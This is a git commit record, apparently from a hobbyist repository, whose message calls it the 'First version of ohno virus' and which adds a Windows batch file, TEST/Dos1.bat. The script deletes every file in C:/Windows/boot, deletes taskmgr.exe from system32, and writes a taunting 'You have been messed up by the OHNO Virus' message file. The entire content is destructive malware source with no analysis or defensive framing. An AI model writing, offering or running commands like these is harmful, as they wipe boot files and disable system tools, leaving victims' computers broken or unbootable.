f0281d048fbb0eb4c9a072be0f95e92bf95b3cbe
powerpellet1077 <70673296+powerpellet1077@users.noreply.github.com>
2021-03-04 08:30:22 -0800

    First version of ohno virus

---
+++ TEST/Dos1.bat
@@ -0,0 +1,7 @@
+cd C:/Windows/boot
+del *
+del C:/Windows/system32/taskmgr.exe
+echo You have been messed up by the OHNO Virus > MESSAGE.txt
+echo If this was a MASTAKE, plz delete me and >> MESSAGE.txt
+echo LIVE YOUR NEW COMPUTER LIFE >> MESSAGE.txt
+
